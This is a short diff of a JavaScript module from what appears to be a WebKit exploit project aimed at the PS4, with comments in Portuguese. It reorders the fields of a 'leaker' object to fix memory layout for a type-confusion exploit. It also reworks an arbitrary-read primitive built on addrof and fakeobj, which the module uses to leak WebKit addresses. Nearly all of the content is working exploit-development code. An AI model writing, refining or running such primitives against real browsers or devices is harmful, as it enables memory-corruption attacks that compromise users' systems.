@@ -1,10 +1,10 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v06 - R/W Primitive Fix)
+// js/script3/testArrayBufferVictimCrash.mjs (v07 - Leaker Layout Fix)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
 // 1. Base de código 100% original mantida.
-// 2. CORREÇÃO: Adicionada uma linha à primitiva arb_read_final para limpar o estado
-//    "stale" (preso), que foi a causa raiz revelada pelo log anterior.
-// 3. Lógica de depuração para PS4 mantida para verificar a correção.
+// 2. CORREÇÃO: A ordem das propriedades no objeto 'leaker' foi invertida. Esta é uma
+//    técnica padrão para corrigir o layout de memória para explorações de confusão de tipo.
+// 3. A correção anterior na arb_read_final foi revertida para testar o novo layout de forma limpa.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -172,14 +172,15 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         }
 
         logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
-        const leaker = { obj_prop: null, val_prop: 0 };
+        
+        // <-- MUDANÇA: A ordem das propriedades foi invertida para tentar corrigir o layout de memória.
+        const leaker = { val_prop: 0, obj_prop: null };
+        
         const leaker_addr = addrof(leaker);
         logS3(`Endereço do objeto leaker: ${leaker_addr.toString(true)}`, "debug");
         
         const arb_read_final = (addr) => {
-            // <-- MUDANÇA: A correção crucial. Limpar o valor antigo antes de tentar ler o novo.
-            leaker.val_prop = null; 
-            
+            // A correção anterior (leaker.val_prop = null) foi removida para testar o novo layout.
             logS3(`    arb_read_final: Preparando para ler de ${addr.toString(true)}`, "debug");
             leaker.obj_prop = fakeobj(addr);
             const result = doubleToInt64(leaker.val_prop);
